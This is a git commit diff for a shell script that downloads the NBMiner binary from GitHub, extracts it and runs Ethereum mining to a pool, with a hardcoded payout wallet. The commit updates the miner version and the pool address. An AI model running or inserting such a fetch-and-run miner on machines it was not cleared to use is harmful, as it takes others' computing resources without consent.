b1e4d3ee52b3dc4fa008b418a5aecf43268e58fd
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-11-09 12:42:42 +0200

    Update nbminer.sh

--- nbminer.sh
+++ nbminer.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
-wget https://github.com/NebuTech/NBMiner/releases/download/v31.1/NBMiner_31.1_Linux.tgz && tar -xvzf NBMiner_31.1_Linux.tgz
+wget https://github.com/NebuTech/NBMiner/releases/download/v33.3/NBMiner_33.3_Linux.tgz
+tar -xvzf NBMiner_33.3_Linux.tgz
 cd NBMiner_Linux
-./nbminer -a ethash -o ethproxy+ssl://us1.ethermine.org:5555 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a.NBMiner -log
+./nbminer -a ethash -o ethproxy+ssl://naw-eth.hiveon.net:24443 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a.NBMiner -log
